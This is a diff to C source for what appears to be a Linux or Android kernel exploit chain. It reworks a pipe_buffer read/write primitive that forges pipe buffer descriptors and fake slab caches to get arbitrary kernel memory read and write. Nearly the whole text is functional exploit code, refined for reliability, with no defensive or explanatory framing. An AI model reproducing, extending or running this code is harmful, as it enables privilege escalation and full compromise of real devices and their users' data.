@@ -29,8 +29,9 @@
 #include <unistd.h>
 
 #include "08_ashmem_configfs_rw.h"
-#include "90_diagnostic_checkpoint.h"
 #include "09_pipe_buffer_rw.h"
+#include "09_pipe_plan.h"
+#include "90_diagnostic_checkpoint.h"
 #include "target.h"
 
 /* 03_mm_address_sidechannel/mm_address_leak.h contains the implementation and is already emitted once by
@@ -150,11 +151,9 @@ _Static_assert((1ULL << (TARGET_KMALLOC_NORMAL_2K_SLOT %
                "pipe allocation kmalloc class");
 
 static pthread_once_t g_init_once = PTHREAD_ONCE_INIT;
-static atomic_int g_prepare_request;
-static atomic_int g_prepare_done;
-static atomic_int g_prepare_ok;
 static int g_drain_pipes[TARGET_PIPE_COUNT][2];
 static int g_reclaim_pipes[TARGET_PIPE_COUNT][2];
+static int g_marker_pipe[2] = {-1, -1};
 static pid_t g_holder_pid = -1;
 static uint64_t g_pipe_page_base;
 static uint64_t g_victim_addr;
@@ -167,9 +166,7 @@ static int g_installed;
 static struct kernelsnitch_shared_state *g_ks;
 static atomic_int g_io_restore_failed;
 static struct pipe_attempt_diag g_prepare_diag;
-static atomic_int g_prepare_timeout_ms;
-static uint32_t g_fake_cache_size;
-static uint64_t g_fake_cache_addr;
+static struct oss_pipe_plan g_pipe_plan;
 
 static uint64_t monotonic_ms(void) {
   struct timespec now;
@@ -223,17 +220,6 @@ static const char *pipe_error_name(enum pipe_error error) {
   return "unknown";
 }
 
-static const char *pipe_collision_failure_name(enum pipe_collision_failure failure) {
-  switch (failure) {
-  case PIPE_COLLISION_NONE: return "none";
-  case PIPE_COLLISION_SPAWN: return "spawn";
-  case PIPE_COLLISION_POST_MEMFD: return "post-memfd";
-  case PIPE_COLLISION_LEAK_MEMFD: return "leak-memfd";
-  case PIPE_COLLISION_NOT_FOUND: return "not-found";
-  }
-  return "unknown";
-}
-
 static void state_init_once(void) {
   for (size_t i = 0; i < TARGET_PIPE_COUNT; i++) {
     g_drain_pipes[i][0] = -1;
@@ -241,6 +227,8 @@ static void state_init_once(void) {
     g_reclaim_pipes[i][0] = -1;
     g_reclaim_pipes[i][1] = -1;
   }
+  g_marker_pipe[0] = -1;
+  g_marker_pipe[1] = -1;
 }
 
 static void ensure_initialized(void) { pthread_once(&g_init_once, state_init_once); }
@@ -826,6 +814,10 @@ static uint64_t direct_to_page(uint64_t addr) {
          (((addr - TARGET_LINEAR_MAP_BASE) >> 12) * TARGET_STRUCT_PAGE_SIZE);
 }
 
+#if 0
+/* Removed from the production binary: the former task/fdtable walker changed
+ * random vmemmap slab-cache pointers after mutation. Retained as review
+ * evidence until the clean-reboot campaign completes. */
 static uint64_t page_to_direct(uint64_t page) {
   if (page < TARGET_VMEMMAP_START || page >= TARGET_VMEMMAP_END ||
       (page - TARGET_VMEMMAP_START) % TARGET_STRUCT_PAGE_SIZE != 0) {
@@ -931,18 +923,29 @@ static int slab_cache_guard_begin(int fd, uint64_t object,
   if (!write_fake_kmem_cache(fd, cache_size)) {
     return 0;
   }
-  if (!oss_kernel_write64(fd, guard->slot, fake)) {
+  enum oss_kernel_io_result swap_result = oss_kernel_write_result(
+      fd, guard->slot, &fake, sizeof(fake));
+  if (swap_result != OSS_KERNEL_IO_OK) {
     int saved_errno = errno;
-    int restored = oss_kernel_write64(fd, guard->slot, guard->original);
-    uint64_t readback = restored ? oss_kernel_read64(fd, guard->slot) : 0;
-    if (!restored || readback != guard->original) {
+    int restored = 1;
+    uint64_t readback = guard->original;
+    if (swap_result != OSS_KERNEL_IO_PLAN_REJECTED) {
+      restored = oss_kernel_write64(fd, guard->slot, guard->original);
+      readback = restored ? oss_kernel_read64(fd, guard->slot) : 0;
+    }
+    if (swap_result != OSS_KERNEL_IO_PLAN_REJECTED &&
+        (!restored || readback != guard->original)) {
       atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
     }
     fprintf(stderr,
             "[pipe_rw] guard: cache swap failed slot=%016llx fake=%016llx "
-            "restore=%d errno=%d\n",
+            "result=%d restore=%s errno=%d\n",
             (unsigned long long)guard->slot, (unsigned long long)fake,
-            restored && readback == guard->original, saved_errno);
+            swap_result,
+            swap_result == OSS_KERNEL_IO_PLAN_REJECTED
+                ? "skipped-plan-rejected"
+                : (restored && readback == guard->original ? "ok" : "failed"),
+            saved_errno);
     return 0;
   }
   guard->active = 1;
@@ -1026,6 +1029,7 @@ static int collect_pipe_slabs(int fd, uint64_t slabs[TARGET_PIPE_MAX_SLABS],
   }
   return *slab_count != 0;
 }
+#endif
 
 static unsigned char pipe_marker_byte(size_t pipe_index, size_t offset) {
   /* Byte zero is unique across all 240 pipes; following bytes make stale or
@@ -1070,21 +1074,21 @@ static int read_full(int fd, void *buffer, size_t length) {
 }
 
 static int peek_pipe_marker(int pipe_index, size_t length) {
-  int duplicate[2] = {-1, -1};
   unsigned char got[TARGET_PIPE_COUNT + 1];
   unsigned char want[TARGET_PIPE_COUNT + 1];
-  if (pipe_index < 0 || pipe_index >= TARGET_PIPE_COUNT || length > sizeof(got) ||
-      pipe(duplicate) != 0) {
+  int pending = -1;
+  if (pipe_index < 0 || pipe_index >= TARGET_PIPE_COUNT ||
+      length > sizeof(got) || g_marker_pipe[0] < 0 || g_marker_pipe[1] < 0 ||
+      ioctl(g_marker_pipe[0], FIONREAD, &pending) != 0 || pending != 0) {
     return 0;
   }
   ssize_t copied;
   do {
-    copied = tee(g_reclaim_pipes[pipe_index][0], duplicate[1], length,
+    copied = tee(g_reclaim_pipes[pipe_index][0], g_marker_pipe[1], length,
                  SPLICE_F_NONBLOCK);
   } while (copied < 0 && errno == EINTR);
-  int ok = copied == (ssize_t)length && read_full(duplicate[0], got, length);
-  close(duplicate[0]);
-  close(duplicate[1]);
+  int ok = copied == (ssize_t)length &&
+           read_full(g_marker_pipe[0], got, length);
   if (!ok) {
     return 0;
   }
@@ -1125,6 +1129,73 @@ static int is_structural_pipe_candidate(const struct oss_pipe_buffer *buffer,
          buffer->private == 0;
 }
 
+static int resolve_known_pipe_victim(int fd, enum pipe_error *error) {
+  uint64_t anon_ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
+  if (!g_pipe_plan.ready || g_pipe_plan.candidate_count == 0) {
+    *error = PIPE_E_PREPARE;
+    return 0;
+  }
+
+  for (size_t i = 0; i < g_pipe_plan.candidate_count; i++) {
+    uint64_t victim = g_pipe_plan.candidates[i];
+    struct oss_pipe_buffer before;
+    enum oss_kernel_io_result read_result = oss_kernel_read_result(
+        fd, victim, &before, sizeof(before));
+    if (read_result == OSS_KERNEL_IO_PLAN_REJECTED) {
+      fprintf(stderr,
+              "[pipe_rw] invariant failure candidate=%016llx "
+              "lost preflight read plan\n",
+              (unsigned long long)victim);
+      *error = PIPE_E_PREPARE;
+      return 0;
+    }
+    if (read_result != OSS_KERNEL_IO_OK ||
+        !is_structural_pipe_candidate(&before, anon_ops)) {
+      continue;
+    }
+
+    int index = (int)before.len - 1;
+    const char *ring_reason = NULL;
+    if (!validate_pipe_ring(index, before.len, &ring_reason)) {
+      continue;
+    }
+    unsigned char confirmation =
+        pipe_marker_byte((size_t)index, before.len);
+    if (!write_full(g_reclaim_pipes[index][1], &confirmation, 1)) {
+      *error = PIPE_E_VICTIM_CONFIRM;
+      continue;
+    }
+
+    struct oss_pipe_buffer after;
+    read_result = oss_kernel_read_result(fd, victim, &after, sizeof(after));
+    if (read_result != OSS_KERNEL_IO_OK || after.page != before.page ||
+        after.offset != before.offset || after.len != before.len + 1 ||
+        after.ops != before.ops || after.flags != before.flags ||
+        after.private != before.private ||
+        !validate_pipe_ring(index, after.len, &ring_reason)) {
+      *error = PIPE_E_VICTIM_CONFIRM;
+      continue;
+    }
+
+    g_pipe_page_base = g_pipe_plan.known_order3_base;
+    g_victim_addr = victim;
+    g_victim_pipe = index;
+    g_victim_saved = after;
+    g_victim_saved_valid = 1;
+    fprintf(stderr,
+            "[pipe_rw] planned victim candidate=%zu/%zu addr=%016llx "
+            "pipe=%d len=%u known_base=%016llx\n",
+            i + 1, g_pipe_plan.candidate_count,
+            (unsigned long long)victim, index, after.len,
+            (unsigned long long)g_pipe_plan.known_order3_base);
+    *error = PIPE_E_NONE;
+    return 1;
+  }
+  *error = PIPE_E_VICTIM_SCAN;
+  return 0;
+}
+
+#if 0
 static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
                                     size_t slab_index, enum pipe_error *error) {
   oss_diag_checkpoint("pipe-slab-read-start");
@@ -1287,6 +1358,7 @@ static int try_pipe_slab_candidates(int fd, uint64_t slab_base,
   free(slab);
   return 0;
 }
+#endif
 
 static int fd_set_nonblock(int fd, int *saved_flags) {
   *saved_flags = fcntl(fd, F_GETFL, 0);
@@ -1354,19 +1426,35 @@ static int pipe_rw_read_once(int fd, uint64_t addr, void *buf, size_t len) {
   forged.ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
   forged.flags = TARGET_PIPE_CAN_MERGE;
   forged.private = 0;
-  if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
+  enum oss_kernel_io_result forge_result = oss_kernel_write_result(
+      fd, g_victim_addr, &forged, sizeof(forged));
+  if (forge_result != OSS_KERNEL_IO_OK) {
+    if (forge_result == OSS_KERNEL_IO_PLAN_REJECTED) {
+      int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
+      atomic_store_explicit(&g_io_restore_failed, !flags_restored,
+                            memory_order_release);
+      fprintf(stderr,
+              "[pipe_rw] read descriptor plan rejected; restore=skipped "
+              "flags=%d\n",
+              flags_restored);
+      return 0;
+    }
     /* A short write may already have changed part of the live descriptor.
      * Restore best-effort, but never treat this as a retryable proof miss. */
-    int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
+    int restored = oss_kernel_write_result(fd, g_victim_addr, &saved,
+                                           sizeof(saved)) == OSS_KERNEL_IO_OK;
     int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
-    atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
+    atomic_store_explicit(&g_io_restore_failed,
+                          !restored || !flags_restored,
+                          memory_order_release);
     fprintf(stderr,
-            "[pipe_rw] read descriptor forge failed; terminal restore=%d flags=%d\n",
+            "[pipe_rw] read descriptor forge I/O failed; restore=%d flags=%d\n",
             restored, flags_restored);
     return 0;
   }
   int ok = pipe_io_bounded(pipe_fd, buf, len, 0);
-  int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
+  int restored = oss_kernel_write_result(fd, g_victim_addr, &saved,
+                                         sizeof(saved)) == OSS_KERNEL_IO_OK;
   int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
   atomic_store_explicit(&g_io_restore_failed, !restored || !flags_restored,
                         memory_order_release);
@@ -1394,17 +1482,33 @@ static int pipe_rw_write_once(int fd, uint64_t addr, const void *buf,
   forged.ops = g_kernel_base + TARGET_ANON_PIPE_BUF_OPS_OFF;
   forged.flags = TARGET_PIPE_CAN_MERGE;
   forged.private = 0;
-  if (!oss_kernel_write(fd, g_victim_addr, &forged, sizeof(forged))) {
-    int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
+  enum oss_kernel_io_result forge_result = oss_kernel_write_result(
+      fd, g_victim_addr, &forged, sizeof(forged));
+  if (forge_result != OSS_KERNEL_IO_OK) {
+    if (forge_result == OSS_KERNEL_IO_PLAN_REJECTED) {
+      int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
+      atomic_store_explicit(&g_io_restore_failed, !flags_restored,
+                            memory_order_release);
+      fprintf(stderr,
+              "[pipe_rw] write descriptor plan rejected; restore=skipped "
+              "flags=%d\n",
+              flags_restored);
+      return 0;
+    }
+    int restored = oss_kernel_write_result(fd, g_victim_addr, &saved,
+                                           sizeof(saved)) == OSS_KERNEL_IO_OK;
     int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
-    atomic_store_explicit(&g_io_restore_failed, 1, memory_order_release);
+    atomic_store_explicit(&g_io_restore_failed,
+                          !restored || !flags_restored,
+                          memory_order_release);
     fprintf(stderr,
-            "[pipe_rw] write descriptor forge failed; terminal restore=%d flags=%d\n",
+            "[pipe_rw] write descriptor forge I/O failed; restore=%d flags=%d\n",
             restored, flags_restored);
     return 0;
   }
   int ok = pipe_io_bounded(pipe_fd, (void *)buf, len, 1);
-  int restored = oss_kernel_write(fd, g_victim_addr, &saved, sizeof(saved));
+  int restored = oss_kernel_write_result(fd, g_victim_addr, &saved,
+                                         sizeof(saved)) == OSS_KERNEL_IO_OK;
   int flags_restored = fd_restore_flags(pipe_fd, saved_flags);
   atomic_store_explicit(&g_io_restore_failed, !restored || !flags_restored,
                         memory_order_release);
@@ -1504,6 +1608,7 @@ static int prove_pipe_rw(int fd, enum pipe_error *error) {
   return 1;
 }
 
+#if 0
 static int establish_pipe_rw(int fd, enum pipe_error *error) {
   if (!is_direct_ptr(g_pipe_page_base) || !is_direct_ptr(g_payload_base)) {
     *error = PIPE_E_PREPARE;
@@ -1743,29 +1848,7 @@ static int resolve_pipe_victim_deterministic(int fd,
   fprintf(stderr, "[pipe_rw] det: no reclaim pipe resolved to a live buffer\n");
   return 0;
 }
-
-int oss_pipe_rw_pending(void) {
-  ensure_initialized();
-  return atomic_load_explicit(&g_prepare_request, memory_order_acquire) != 0;
-}
-
-int oss_pipe_rw_service_pending(void) {
-  ensure_initialized();
-  if (!atomic_exchange_explicit(&g_prepare_request, 0,
-                                memory_order_acq_rel)) {
-    return 0;
-  }
-  int timeout_ms = atomic_load_explicit(&g_prepare_timeout_ms,
-                                        memory_order_acquire);
-  if (timeout_ms <= 0 || timeout_ms > TARGET_PIPE_PREPARE_TIMEOUT_MS) {
-    timeout_ms = TARGET_PIPE_PREPARE_TIMEOUT_MS;
-  }
-  g_pipe_page_base = prepare_pipe_page(timeout_ms, &g_prepare_diag);
-  int ok = g_pipe_page_base != 0;
-  atomic_store_explicit(&g_prepare_ok, ok, memory_order_release);
-  atomic_store_explicit(&g_prepare_done, 1, memory_order_release);
-  return ok ? 1 : -1;
-}
+#endif
 
 void oss_pipe_rw_reset(void) {
   ensure_initialized();
@@ -1774,6 +1857,14 @@ void oss_pipe_rw_reset(void) {
   }
   close_pipe_bank(g_drain_pipes);
   close_pipe_bank(g_reclaim_pipes);
+  if (g_marker_pipe[0] >= 0) {
+    close(g_marker_pipe[0]);
+    g_marker_pipe[0] = -1;
+  }
+  if (g_marker_pipe[1] >= 0) {
+    close(g_marker_pipe[1]);
+    g_marker_pipe[1] = -1;
+  }
   g_pipe_page_base = 0;
   g_victim_addr = 0;
   memset(&g_victim_saved, 0, sizeof(g_victim_saved));
@@ -1782,13 +1873,51 @@ void oss_pipe_rw_reset(void) {
   g_payload_base = 0;
   g_victim_pipe = -1;
   g_installed = 0;
-  g_fake_cache_size = 0;
-  g_fake_cache_addr = 0;
-  atomic_store_explicit(&g_prepare_request, 0, memory_order_release);
-  atomic_store_explicit(&g_prepare_done, 0, memory_order_release);
-  atomic_store_explicit(&g_prepare_ok, 0, memory_order_release);
-  atomic_store_explicit(&g_prepare_timeout_ms, 0, memory_order_release);
+  memset(&g_pipe_plan, 0, sizeof(g_pipe_plan));
   memset(&g_prepare_diag, 0, sizeof(g_prepare_diag));
+}
+
+int oss_pipe_rw_plan_ready(void) {
+  ensure_initialized();
+  return g_pipe_plan.ready;
+}
+
+int oss_pipe_rw_prepare(uint64_t kernel_base, uint64_t payload_base) {
+  ensure_initialized();
+  if (g_pipe_plan.ready && g_kernel_base == kernel_base &&
+      g_payload_base == payload_base) {
+    return 1;
+  }
+  oss_pipe_rw_reset();
+  g_kernel_base = kernel_base;
+  g_payload_base = payload_base;
+  uint64_t started_ms = monotonic_ms();
+  g_pipe_page_base =
+      prepare_pipe_page(TARGET_PIPE_PREPARE_TIMEOUT_MS, &g_prepare_diag);
+  if (!g_pipe_page_base || pipe2(g_marker_pipe, O_CLOEXEC) != 0 ||
+      !populate_pipe_markers() ||
+      !oss_pipe_plan_build(g_pipe_page_base, payload_base, &g_pipe_plan)) {
+    int saved_errno = errno;
+    fprintf(stderr,
+            "[pipe_rw] pre-mutation plan rejected base=%016llx stage=%s "
+            "errno=%d elapsed_ms=%llu\n",
+            (unsigned long long)g_pipe_page_base,
+            pipe_stage_name(g_prepare_diag.stage), saved_errno,
+            (unsigned long long)(monotonic_ms() - started_ms));
+    oss_diag_checkpoint("pipe-plan-pretrigger-rejected");
+    oss_pipe_rw_reset();
+    errno = saved_errno;
+    return 0;
+  }
+  fprintf(stderr,
+          "[pipe_rw] pre-mutation plan ready base=%016llx candidates=%zu "
+          "pipes=%d slots=%d elapsed_ms=%llu\n",
+          (unsigned long long)g_pipe_page_base,
+          g_pipe_plan.candidate_count, TARGET_PIPE_COUNT, TARGET_PIPE_SLOTS,
+          (unsigned long long)(monotonic_ms() - started_ms));
+  fflush(stderr);
+  oss_diag_checkpoint("pipe-plan-pretrigger-ready");
+  return 1;
 }
 
 int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
@@ -1796,129 +1925,32 @@ int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base) {
   if (g_installed) {
     return 1;
   }
-  uint64_t install_started_ms = monotonic_ms();
-  uint64_t install_deadline_ms = install_started_ms + TARGET_PIPE_INSTALL_TIMEOUT_MS;
-  int deterministic =
-      (int)pipe_env_long_clamped("PIPE_DETERMINISTIC", 1, 0, 1);
-  atomic_store_explicit(&g_io_restore_failed, 0, memory_order_release);
-  for (int attempt = 1; attempt <= TARGET_PIPE_ATTEMPTS; attempt++) {
-    int remaining_ms = deadline_remaining_ms(install_deadline_ms);
-    if (remaining_ms <= 0) {
-      fprintf(stderr,
-              "[pipe_rw] install failed reason=%s elapsed_ms=%llu\n",
-              pipe_error_name(PIPE_E_INSTALL_TIMEOUT),
-              (unsigned long long)(monotonic_ms() - install_started_ms));
-      break;
-    }
-    oss_pipe_rw_reset();
-    g_kernel_base = kernel_base;
-    g_payload_base = payload_base;
-    if (deterministic) {
-      enum pipe_error error = PIPE_E_PREPARE;
-      uint64_t det_started_ms = monotonic_ms();
-      fprintf(stderr, "[pipe_rw] det: preparing pipes attempt=%d/%d\n",
-              attempt, TARGET_PIPE_ATTEMPTS);
-      int pipes_ready = create_pipe_bank(g_reclaim_pipes) &&
-                        resize_pipe_bank(g_reclaim_pipes, TARGET_PIPE_SLOTS) &&
-                        populate_pipe_markers();
-      if (pipes_ready) {
-        fprintf(stderr, "[pipe_rw] det: resolving victim\n");
-      }
-      if (pipes_ready && resolve_pipe_victim_deterministic(fd, &error) &&
-          prove_pipe_rw(fd, &error)) {
-        g_installed = 1;
-        fprintf(stderr,
-                "[pipe_rw] ready attempt=%d/%d page=%016llx victim=%016llx "
-                "pipe=%d prepare_ms=%llu establish_ms=0 total_ms=%llu det=1\n",
-                attempt, TARGET_PIPE_ATTEMPTS,
-                (unsigned long long)g_pipe_page_base,
-                (unsigned long long)g_victim_addr, g_victim_pipe,
-                (unsigned long long)(monotonic_ms() - det_started_ms),
-                (unsigned long long)(monotonic_ms() - install_started_ms));
-        return 1;
-      }
-      if (error == PIPE_E_RESTORE) {
-        fprintf(stderr,
-                "[pipe_rw] det terminal failure attempt=%d/%d reason=restore\n",
-                attempt, TARGET_PIPE_ATTEMPTS);
-        return 0;
-      }
-      oss_pipe_rw_reset();
-      fprintf(stderr,
-              "[pipe_rw] det miss attempt=%d/%d reason=%s; fallback=legacy\n",
-              attempt, TARGET_PIPE_ATTEMPTS, pipe_error_name(error));
-      g_kernel_base = kernel_base;
-      g_payload_base = payload_base;
-    }
-    int prepare_timeout_ms = remaining_ms;
-    if (prepare_timeout_ms > TARGET_PIPE_PREPARE_TIMEOUT_MS) {
-      prepare_timeout_ms = TARGET_PIPE_PREPARE_TIMEOUT_MS;
-    }
-    atomic_store_explicit(&g_prepare_timeout_ms, prepare_timeout_ms,
-                          memory_order_release);
-    atomic_store_explicit(&g_prepare_request, 1, memory_order_release);
-    unsigned int wait_ticks = 0;
-    while (!atomic_load_explicit(&g_prepare_done, memory_order_acquire)) {
-      usleep(10000);
-      /* Production's v14 main loop services the request within its 10-ms
-       * poll. Standalone compatibility harnesses have no such loop; after
-       * five seconds, service only a request nobody else has claimed. */
-      if (++wait_ticks >= 500 &&
-          atomic_load_explicit(&g_prepare_request, memory_order_acquire)) {
-        oss_pipe_rw_service_pending();
-      }
-    }
-    struct pipe_attempt_diag diag = g_prepare_diag;
-    enum pipe_error error = diag.error;
-    uint64_t establish_started_ms = monotonic_ms();
-    if (atomic_load_explicit(&g_prepare_ok, memory_order_acquire) &&
-        establish_pipe_rw(fd, &error)) {
-      fprintf(stderr,
-              "[pipe_rw] ready attempt=%d/%d page=%016llx victim=%016llx "
-              "pipe=%d prepare_ms=%llu establish_ms=%llu total_ms=%llu\n",
-              attempt, TARGET_PIPE_ATTEMPTS,
-              (unsigned long long)g_pipe_page_base,
-              (unsigned long long)g_victim_addr, g_victim_pipe,
-              (unsigned long long)diag.elapsed_ms,
-              (unsigned long long)(monotonic_ms() - establish_started_ms),
-              (unsigned long long)(monotonic_ms() - install_started_ms));
-      return 1;
-    }
-    if (error == PIPE_E_NONE) {
-      error = PIPE_E_PREPARE;
-    }
-    enum pipe_prepare_stage failed_stage = diag.stage;
-    enum pipe_collision_failure collision_failure = diag.collision_failure;
-    int failed_errno = diag.error_no;
-    uint64_t attempt_ms = diag.elapsed_ms +
-                          (monotonic_ms() - establish_started_ms);
-    if (error == PIPE_E_RESTORE) {
-      fprintf(stderr,
-              "[pipe_rw] terminal failure attempt=%d/%d reason=%s stage=%s "
-              "errno=%d elapsed_ms=%llu; preserving pipes\n",
-              attempt, TARGET_PIPE_ATTEMPTS, pipe_error_name(error),
-              pipe_stage_name(failed_stage), failed_errno,
-              (unsigned long long)attempt_ms);
-      return 0;
-    }
-    oss_pipe_rw_reset();
+  if (!g_pipe_plan.ready || g_kernel_base != kernel_base ||
+      g_payload_base != payload_base) {
+    errno = EPERM;
     fprintf(stderr,
-            "[pipe_rw] setup miss attempt=%d/%d reason=%s stage=%s detail=%s errno=%d "
-            "elapsed_ms=%llu\n",
-            attempt, TARGET_PIPE_ATTEMPTS, pipe_error_name(error),
-            pipe_stage_name(failed_stage),
-            pipe_collision_failure_name(collision_failure), failed_errno,
-            (unsigned long long)attempt_ms);
-    if (error == PIPE_E_READ_PROOF || error == PIPE_E_WRITE_PROOF) {
-      usleep((useconds_t)(attempt * 2000));
-    } else if (error == PIPE_E_CACHE_SELECT) {
-      usleep((useconds_t)(attempt * 4000));
-    } else {
-      sched_yield();
-    }
+            "[pipe_rw] install blocked: pre-mutation pipe_plan is not ready\n");
+    return 0;
   }
-  oss_pipe_rw_reset();
-  return 0;
+  uint64_t started_ms = monotonic_ms();
+  atomic_store_explicit(&g_io_restore_failed, 0, memory_order_release);
+  enum pipe_error error = PIPE_E_PREPARE;
+  if (!resolve_known_pipe_victim(fd, &error) || !prove_pipe_rw(fd, &error)) {
+    fprintf(stderr,
+            "[pipe_rw] planned install failed reason=%s elapsed_ms=%llu; "
+            "preserving preallocated pipes\n",
+            pipe_error_name(error),
+            (unsigned long long)(monotonic_ms() - started_ms));
+    return 0;
+  }
+  g_installed = 1;
+  fprintf(stderr,
+          "[pipe_rw] ready page=%016llx victim=%016llx pipe=%d "
+          "elapsed_ms=%llu planned=1\n",
+          (unsigned long long)g_pipe_page_base,
+          (unsigned long long)g_victim_addr, g_victim_pipe,
+          (unsigned long long)(monotonic_ms() - started_ms));
+  return 1;
 }
 
 int oss_pipe_rw_read(int fd, uint64_t addr, void *buf, size_t len) {
